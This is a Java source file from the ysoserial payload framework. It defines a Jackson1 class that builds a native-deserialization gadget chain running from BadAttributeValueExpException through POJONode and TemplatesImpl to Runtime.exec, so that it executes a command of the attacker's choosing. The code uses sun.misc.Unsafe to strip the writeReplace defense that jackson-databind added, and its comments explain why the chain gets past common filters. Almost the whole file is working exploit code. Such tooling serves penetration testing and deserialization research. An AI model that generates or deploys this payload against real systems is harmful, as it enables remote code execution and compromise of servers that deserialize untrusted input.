package ysoserial.payloads;

import java.io.ObjectStreamClass;
import java.lang.reflect.Field;
import javax.management.BadAttributeValueExpException;

import com.fasterxml.jackson.databind.node.POJONode;
import sun.misc.Unsafe;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	Jackson-databind gadget chain via POJONode.toString() in native Java deserialization.

	Discovered by @Y4tacker. Jackson-databind research pioneered by @mbechler (marshalsec).

	Gadget chain:
		ObjectInputStream.readObject()
			BadAttributeValueExpException.readObject()
				POJONode.toString()
					InternalNodeMapper.nodeToString()
						ObjectMapper.writeValueAsString()
							[getter invocation on wrapped POJO]
								TemplatesImpl.getOutputProperties()
									TemplatesImpl.newTransformer()
										defineClass() + newInstance()
											Runtime.exec()

	Why this matters:
		- jackson-databind is one of the most common Java dependencies
		- This is a NATIVE Java deserialization chain (ObjectInputStream), NOT Jackson JSON deser
		- BadAttributeValueExpException is a JMX class, rarely filtered
		- POJONode wraps any object and invokes all its getters via ObjectMapper on toString()
		- Works when SecurityManager is not set (default on all modern JDKs)
		- SecurityManager is deprecated since JDK 17 and removed in JDK 24

	Note: jackson-databind 2.14+ added writeReplace() to BaseJsonNode as defense,
	backported to 2.12.7.1. We clear it via ObjectStreamClass reflection at generation time.
	The payload works on targets with any 2.x because writeReplace is not
	called during deserialization (readObject path).

	Requires:
		jackson-databind 2.x (any version on target)
 */

@SuppressWarnings({"rawtypes", "unchecked", "restriction"})
@Dependencies({"com.fasterxml.jackson.core:jackson-databind:2.12.7.1"})
@Authors({ Authors.Y4TACKER, Authors.MBECHLER })
public class Jackson1 extends PayloadRunner implements ObjectPayload<Object> {

	/**
	 * Clear writeReplace from ObjectStreamClass to prevent BaseJsonNode.writeReplace()
	 * from being called during serialization. This is needed because jackson-databind
	 * 2.12.7.1+ backported the writeReplace defense from 2.14.
	 */
	static void clearWriteReplace(Class<?> clazz) throws Exception {
		Field unsafeField = Unsafe.class.getDeclaredField("theUnsafe");
		unsafeField.setAccessible(true);
		Unsafe unsafe = (Unsafe) unsafeField.get(null);

		ObjectStreamClass osc = ObjectStreamClass.lookup(clazz);
		Field writeReplaceField = ObjectStreamClass.class.getDeclaredField("writeReplaceMethod");
		long offset = unsafe.objectFieldOffset(writeReplaceField);
		unsafe.putObject(osc, offset, null);
	}

	public Object getObject(final String command) throws Exception {
		Object templatesImpl = Gadgets.createTemplatesImpl(command);

		POJONode pojoNode = new POJONode(templatesImpl);

		// Clear writeReplace from BaseJsonNode's ObjectStreamClass descriptor
		clearWriteReplace(POJONode.class);

		BadAttributeValueExpException val = new BadAttributeValueExpException(null);
		// JDK 17+ changed val field type from Object to String — use Unsafe to bypass
		final Field unsafeField = Unsafe.class.getDeclaredField("theUnsafe");
		unsafeField.setAccessible(true);
		final Unsafe unsafe = (Unsafe) unsafeField.get(null);
		final Field valField = BadAttributeValueExpException.class.getDeclaredField("val");
		unsafe.putObject(val, unsafe.objectFieldOffset(valField), pojoNode);

		return val;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(Jackson1.class, args);
	}
}
